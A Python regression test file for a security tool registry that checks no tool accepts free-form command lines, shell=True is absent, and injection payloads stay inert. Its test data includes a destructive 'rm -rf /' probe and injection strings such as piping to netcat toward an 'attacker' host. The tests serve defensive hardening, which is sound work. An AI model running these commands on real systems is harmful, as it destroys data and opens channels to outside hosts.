"""Regression tests: no registered tool may act as an arbitrary-command API.

A tool whose parameter is a free-form command string is an arbitrary-command
API wearing a tool's name. It defeats every control above it -- scope, policy,
audit -- because what actually runs is chosen by the caller, not the registry.
These tests fail if such a tool is ever reintroduced.
"""

import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from nexhunter.core import tools as T

# Parameter names that would carry a command line rather than a value.
FORBIDDEN_PARAMS = {
    "command", "cmd", "args", "arguments", "extra", "extra_args",
    "additional_args", "additional", "options", "opts", "flags", "raw",
}

# Tools that legitimately take shell-ish text as data, not as a command line.
# Each needs a reason, and its builder must still pass the argv checks below.
ALLOWED_TEXT_PARAMS = {
    # (tool name, param): reason
}


def test_no_tool_takes_a_command_parameter():
    """No registered tool exposes a free-form command parameter."""
    print("[TEST] No tool takes a command-shaped parameter...")

    offenders = []
    for name, spec in T.TOOLS.items():
        for param in spec.params:
            if param.lower() in FORBIDDEN_PARAMS and (name, param) not in ALLOWED_TEXT_PARAMS:
                offenders.append(f"{name}.{param}")

    assert not offenders, (
        "these tools accept a free-form command line, which is an "
        f"arbitrary-command API: {', '.join(sorted(offenders))}"
    )
    print(f"  [OK] {len(T.TOOLS)} tools carry no command parameter")


def test_no_builder_splits_a_parameter_into_argv():
    """No builder expands a caller-supplied string into multiple arguments.

    ["aws"] + params["command"].split() turns one parameter into any AWS
    subcommand the caller likes. Every argument must be a discrete value.
    """
    print("[TEST] No builder splits a parameter into argv...")

    probe = "alpha beta --flag; rm -rf /"
    offenders = []

    for name, spec in T.TOOLS.items():
        params = {key: (probe if default is None else default) for key, default in spec.params.items()}
        try:
            argv = spec.build_cmd(params)
        except Exception:
            continue  # builders that reject the probe are fine
        if not argv:
            continue

        # The probe must never appear as more than one argument, and must never
        # have been broken apart on whitespace.
        pieces = [a for a in argv if isinstance(a, str) and a in {"alpha", "beta", "--flag;", "rm", "-rf", "/"}]
        if pieces:
            offenders.append(f"{name} -> {argv}")

    assert not offenders, (
        "these builders split a parameter into separate arguments: "
        + "; ".join(offenders[:5])
    )
    print("  [OK] No builder splits parameters into argv")


def test_shell_metacharacters_stay_inert():
    """Shell metacharacters in a parameter remain one literal argument."""
    print("[TEST] Shell metacharacters stay inert...")

    payloads = [
        "example.com; whoami",
        "example.com && id",
        "example.com | nc attacker 4444",
        "$(whoami).example.com",
        "`id`.example.com",
        "example.com\nwhoami",
    ]

    spec = T.get_tool_spec("nmap_scan")
    assert spec is not None, "nmap_scan should be registered"

    for payload in payloads:
        argv = spec.build_cmd({"target": payload, "ports": ""})
        assert argv is not None, f"expected a command for {payload!r}"
        # The payload survives intact as exactly one argument: because argv is
        # passed to the OS as a list with no shell, it is data, not syntax.
        assert argv.count(payload) == 1, f"{payload!r} was split or duplicated: {argv}"
        assert "whoami" not in argv, f"metacharacter payload leaked into argv: {argv}"
        assert "id" not in argv

    print(f"  [OK] {len(payloads)} injection payloads stayed inert")


def test_no_shell_true_anywhere_in_execution_paths():
    """No execution path passes shell=True."""
    print("[TEST] shell=True absent from execution paths...")

    root = Path(__file__).parent.parent
    pattern = re.compile(r"shell\s*=\s*True")
    offenders = []

    for path in root.rglob("*.py"):
        if "test" in path.name or "__pycache__" in str(path):
            continue
        text = path.read_text(encoding="utf-8", errors="replace")
        for number, line in enumerate(text.splitlines(), start=1):
            if pattern.search(line) and not line.strip().startswith("#"):
                offenders.append(f"{path.relative_to(root)}:{number}")

    assert not offenders, f"shell=True found at: {', '.join(offenders)}"
    print("  [OK] No shell=True in any non-test module")


def test_cloud_and_container_tools_are_fixed_actions():
    """Cloud, container, and orchestration tools expose named actions only."""
    print("[TEST] Cloud and container tools are fixed actions...")

    binaries = {"aws", "gcloud", "az", "kubectl", "docker", "adb", "snyk", "shodan"}
    checked = 0

    for name, spec in T.TOOLS.items():
        if spec.binary not in binaries:
            continue
        checked += 1
        for param in spec.params:
            assert param.lower() not in FORBIDDEN_PARAMS, (
                f"{name} still takes a passthrough parameter {param!r}"
            )

    assert checked > 0, "expected some cloud/container tools to be registered"
    print(f"  [OK] {checked} cloud/container tools take only named parameters")


def test_removed_passthrough_tools_are_gone():
    """The old passthrough tool names are no longer registered."""
    print("[TEST] Old passthrough tools removed...")

    removed = ["docker", "kubectl", "aws_cli", "gcloud", "az", "adb", "snyk", "shodan_cli", "sliver", "strace"]
    still_present = [name for name in removed if name in T.TOOLS]

    assert not still_present, f"passthrough tools still registered: {still_present}"
    # Replacements exist.
    for replacement in ["aws_get_caller_identity", "kubectl_get_pods", "docker_list_containers"]:
        assert replacement in T.TOOLS, f"expected fixed-action replacement {replacement}"

    print("  [OK] Passthrough names gone, fixed actions registered")


if __name__ == "__main__":
    print("\n=== No-Passthrough Regression Tests ===\n")
    test_no_tool_takes_a_command_parameter()
    test_no_builder_splits_a_parameter_into_argv()
    test_shell_metacharacters_stay_inert()
    test_no_shell_true_anywhere_in_execution_paths()
    test_cloud_and_container_tools_are_fixed_actions()
    test_removed_passthrough_tools_are_gone()
    print("\n=== All No-Passthrough Tests Passed ===\n")
